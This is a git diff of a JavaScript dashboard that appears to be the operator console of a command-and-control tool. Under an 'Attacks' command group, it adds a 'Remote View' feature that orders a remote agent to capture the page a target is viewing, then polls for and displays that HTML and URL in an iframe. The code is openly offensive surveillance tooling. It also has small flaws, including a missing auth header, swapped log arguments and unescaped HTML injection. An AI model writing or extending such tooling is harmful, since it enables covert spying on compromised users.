@@ -26,6 +26,8 @@ function initDashboard(agentId) {
     
     // Set up navigation controls
     setupNavigationControls();
+
+    initRemoteView();
     
     // Set up refresh interval for pending commands and command history
     setInterval(() => {
@@ -176,12 +178,6 @@ function setupCommandInput() {
             clearAllCommands();
         }
     });
-
-    document.getElementById('remote_view')?.addEventListener('click', function() {
-        const remote_panel = document.getElementById('remote_view_panel');
-        remote_panel.style.display = remote_panel.style.display === 'block' ? 'none' : 'block';
-        this.textContent = remote_panel.style.display === 'block' ? 'Hide Remote View' : 'Show Remote View';
-    });
     
     commandInput.addEventListener('keydown', function(e) {
         if (e.key === 'Enter') {
@@ -237,11 +233,7 @@ function setupCommandLibrary() {
         {
             name: 'Attacks',
             commands: [
-<<<<<<< HEAD
-                { name: 'Enable Remote View', command: 'attacks.enable_remote_view' },
-=======
                 {name: "Remote View", command: 'attacks.remote_view'}
->>>>>>> b3b2514e51da6e8a4bd2cf1c0e1b4edc9eed4673
             ]
         },
         {
@@ -593,4 +585,215 @@ function processCompletedCommands(commands) {
         // Mark command as processed
         cmd.processedByConsole = true;
     });
+
+}
+
+let remoteViewActive = true;
+let remoteViewInterval = null;
+
+function initRemoteView() {
+    // Get modal elements
+    const modal = document.getElementById('remote-view-modal');
+    const closeBtn = document.querySelector('.modal-close');
+    // Don't try to find this element at initialization time
+    // const remoteViewBtn = document.getElementById('remote-view');
+    const remoteViewPanelBtn = document.getElementById('remote-view-panel');
+    const refreshBtn = document.getElementById('refresh-remote-view');
+    const stopBtn = document.getElementById('stop-remote-view');
+    
+    // Instead of using direct event listener, we'll use event delegation
+    // This will allow us to handle clicks on dynamically created elements
+    document.addEventListener('click', function(event) {
+        // Check if the clicked element is our remote view command
+        if (event.target.closest('.command-item[data-command="attacks.remote_view"]')) {
+            startRemoteView();
+        }
+    });
+    
+    // Open modal when clicking the Remote View Panel button
+    if (remoteViewPanelBtn) {
+        remoteViewPanelBtn.addEventListener('click', function() {
+            openRemoteViewModal();
+        });
+    }
+    
+    // Close modal when clicking X
+    if (closeBtn) {
+        closeBtn.addEventListener('click', function() {
+            modal.style.display = 'none';
+        });
+    }
+    
+    // Close modal when clicking outside
+    window.addEventListener('click', function(event) {
+        if (modal && event.target === modal) {
+            modal.style.display = 'none';
+        }
+    });
+    
+    // Refresh remote view
+    if (refreshBtn) {
+        refreshBtn.addEventListener('click', function() {
+            startRemoteView();
+        });
+    }
+    
+    // Stop remote view
+    if (stopBtn) {
+        stopBtn.addEventListener('click', function() {
+            stopRemoteView();
+        });
+    }
+}
+
+function openRemoteViewModal() {
+    const modal = document.getElementById('remote-view-modal');
+    modal.style.display = 'block';
+    
+    // Check if we need to start a new remote view session
+    if (!remoteViewActive) {
+        startRemoteView();
+    }
+}
+
+function startRemoteView() {
+    const agentId = document.getElementById('agent-id').textContent;
+    
+    // Display loading message
+    updateRemoteViewStatus('Starting remote view session...');
+    
+    // Send command to start remote viewing
+    fetch(`/commands/agent/${agentId}`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Authorization': 'Bearer ' + localStorage.getItem('jwt_token')
+        },
+        body: JSON.stringify({
+            command: 'remote_view.start'
+        })
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Failed to queue remote view command');
+        }
+        return response.json();
+    })
+    .then(data => {
+        // Check if we got a command object back (success case)
+        if (data && (data.command || (data.command && data.command.id))) {
+            console.log('Remote view command queued:', data);
+            remoteViewActive = true;
+            
+            // Check for updates every 5 seconds
+            if (remoteViewInterval) {
+                clearInterval(remoteViewInterval);
+            }
+            remoteViewInterval = setInterval(fetchRemoteViewData, 5000);
+            
+            // Open the modal
+            openRemoteViewModal();
+            
+            // Add to activity log
+            addActivityLog('Remote view session started', 'COMMAND');
+        } else {
+            console.error('Failed to start remote view:', data);
+            updateRemoteViewStatus('Failed to start remote view: Command could not be queued');
+        }
+    })
+    .catch(error => {
+        console.error('Error starting remote view:', error);
+        updateRemoteViewStatus('Error: ' + error.message);
+    });
+}
+
+function stopRemoteView() {
+    const agentId = document.getElementById('agent-id').textContent;
+    
+    // Clear the update interval
+    if (remoteViewInterval) {
+        clearInterval(remoteViewInterval);
+        remoteViewInterval = null;
+    }
+    
+    // Send command to stop remote viewing
+    fetch(`/commands/agent/${agentId}`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            command: 'remote_view.stop'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            console.log('Remote view stopped:', data);
+            remoteViewActive = false;
+            updateRemoteViewStatus('Remote view stopped');
+            addActivityLog('COMMAND', 'Stopped remote view session');
+        } else {
+            console.error('Failed to stop remote view:', data);
+        }
+    })
+    .catch(error => {
+        console.error('Error stopping remote view:', error);
+    });
+}
+
+function fetchRemoteViewData() {
+    const agentId = document.getElementById('agent-id').textContent;
+    
+    // Use the dedicated remote view endpoint instead of command history
+    fetch(`/commands/agent/${agentId}/remote_view`, {
+        headers: {
+            'Authorization': 'Bearer ' + localStorage.getItem('jwt_token')
+        }
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Failed to fetch remote view data');
+        }
+        return response.json();
+    })
+    .then(data => {
+        if (data && data.remoteView) {
+            displayRemoteViewResult({ result: data.remoteView });
+        } else {
+            console.log('No remote view data available');
+        }
+    })
+    .catch(error => {
+        console.error('Error fetching remote view data:', error);
+    });
+}
+
+function displayRemoteViewResult(commandResult) {
+    try {
+        // Parse the result if it's a string
+        let resultData = commandResult.result;
+        if (typeof resultData === 'string') {
+            resultData = JSON.parse(resultData);
+        }
+        
+        // Update the iframe with the HTML content
+        if (resultData && resultData.html) {
+            const iframe = document.getElementById('remote-view-iframe');
+            iframe.srcdoc = resultData.html;
+            
+            // Update metadata
+            document.getElementById('remote-view-url').textContent = 'URL: ' + (resultData.url || 'Unknown');
+            document.getElementById('remote-view-timestamp').textContent = 'Timestamp: ' + 
+                (resultData.timestamp || new Date().toLocaleString());
+        }
+    } catch (error) {
+        console.error('Error displaying remote view result:', error);
+        updateRemoteViewStatus('Error parsing remote view data');
+    }
+}
+
+function updateRemoteViewStatus(message) {
+    const iframe = document.getElementById('remote-view-iframe');
+    iframe.srcdoc = `<html><body style="font-family: Arial, sans-serif; color: #00eeff; background-color: #0a0a14; display: flex; justify-content: center; align-items: center; height: 100%; margin: 0;"><p>${message}</p></body></html>`;
 }
